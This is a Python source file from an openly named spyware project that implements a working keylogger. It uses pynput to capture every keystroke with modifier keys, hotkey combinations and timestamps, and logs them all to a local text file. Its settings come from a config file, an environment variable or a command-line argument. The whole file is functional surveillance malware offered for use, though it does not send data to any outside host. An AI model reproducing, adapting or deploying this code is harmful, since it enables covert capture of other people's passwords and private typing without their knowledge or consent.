#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This file implements a keylogger.
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This file implements a keylogger.

~# python3 KeyLogger.py keySpy.conf

>>> from os import environ
>>> environ['keySpy.conf'] = 'keySpy.conf'
>>> from SpyWare.KeyLogger import keySpy
>>> keySpy()                  # (using env) OR
>>> keySpy('keySpy.conf')     # (using config file name) OR
>>> keySpy(argv=["KeyLogger.py", "keySpy.conf"]) # (using argv)
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This file implements a complete spyware.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["Daemon", "KeyLogger", "main", "config_load"]

from pynput.keyboard import Key, Listener, Controller, KeyCode
from time import localtime, strftime, struct_time
from os.path import join, dirname, exists
from configparser import ConfigParser
from typing import Union, List
from sys import argv, exit
from os import environ


class CONFIGURATIONS:

    """
    This class contains configurations.
    """

    save_filename: str = "keySpy.txt"
    event_press: int = 0
    event_release: int = 0
    hot_keys: int = 1
    event_time: int = 1


def config_load(filename: str = None, argv: List[str] = argv) -> int:

    """
    This function loads the configuration using a the configuration file.
    """

    CONFIG = ConfigParser()
    default_file_name = "keySpy.conf"

    default_file_path = join(dirname(__file__), default_file_name)
    env_config_file = environ.get(default_file_name)
    arg_config_file = argv[1] if len(argv) == 2 else None

    if filename is not None and exists(filename):
        CONFIG.read(filename)
    elif arg_config_file is not None and exists(arg_config_file):
        CONFIG.read(arg_config_file)
    elif env_config_file and exists(env_config_file):
        CONFIG.read(env_config_file)
    elif exists(default_file_path):
        CONFIG.read(default_file_path)
    else:
        return 1

    CONFIG = CONFIG.__dict__["_sections"]
    CONFIGURATIONS.save_filename = CONFIG.get("SAVE", {}).get(
        "filename", "keySpy.txt"
    )
    CONFIGURATIONS.event_press = int(
        CONFIG.get("SAVE", {}).get("event_press", "0")
    )
    CONFIGURATIONS.event_release = int(
        CONFIG.get("SAVE", {}).get("event_release", "0")
    )
    CONFIGURATIONS.hot_keys = int(CONFIG.get("SAVE", {}).get("hot_keys", "1"))
    CONFIGURATIONS.event_time = int(
        CONFIG.get("SAVE", {}).get("event_time", "1")
    )
    return 0


class KeyLogger:

    """
    This class implements a keylogger.
    """

    def __init__(self):
        self.controller: Controller = Controller()
        filename = self.file = CONFIGURATIONS.save_filename
        self.data_file = open(filename, "a")
        self.is_pressed = set()
        self.counter = 0
        self.run = True
        self.data = ""

    def get_event_press(self, event: Key) -> None:

        """
        This method add a key press event.
        """

        controller = self.controller
        is_pressed = self.is_pressed
        key: str = self.get_event_char(event)

        if CONFIGURATIONS.hot_keys:
            for event in is_pressed:
                key = f"{event} <{key}>"

        if CONFIGURATIONS.event_press:
            key = f"PRESS: {key}"

        if controller.shift_pressed:
            key += " (MAJ)"
        if controller.alt_pressed:
            key += " (ALT)"
        if controller.alt_gr_pressed:
            key += " (ALTGR)"
        if controller.ctrl_pressed:
            key += " (CTRL)"

        is_pressed.add(event)

        self.save(f"{key}\n")
        return self.run

    def get_code(self, event: Union[Key, KeyCode]) -> int:

        """
        This function return the code of Key or KeyCode.
        """

        if isinstance(event, KeyCode):
            code = event.vk
        elif isinstance(event, Key):
            code = event._value_.vk

        return code

    def get_event_release(self, event: Key) -> None:

        """
        This method add a key release event.
        """

        if CONFIGURATIONS.event_release:
            self.save(f"RELEASE: {self.get_event_char(event)}\n")

        # code = self.get_code(event)

        is_pressed = self.is_pressed
        if is_pressed:
            is_pressed.pop()

        return self.run

    def run_for_ever(self) -> None:

        """
        This function starts the keylogger.
        """

        with Listener(
            on_press=self.get_event_press, on_release=self.get_event_release
        ) as listener:
            listener.join()

    def save(self, key: str) -> None:

        """
        This method save pressed keys in file and clean the events list.
        """

        if CONFIGURATIONS.event_time:
            text = f'{strftime("%Y-%m-%d %H:%M:%S")} -> {key}'
        else:
            text = key

        self.counter += 1
        self.data_file.write(text)

        if self.counter >= 1000:
            self.data_file.close()
            self.data_file = open(self.file, "a")
            self.counter = 0

    def get_event_char(self, event: Key) -> str:

        """
        This function get event.char if exist.
        """

        return event.__dict__.get("char") or str(event)


def main(config_filename: str = None, argv: List[str] = argv) -> int:

    """
    This function executes this script from the command line.
    """

    config_load(filename=config_filename, argv=argv)

    daemon = Daemon()

    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False

    return 0


Daemon = KeyLogger

if __name__ == "__main__":
    print(copyright)
    exit(main())
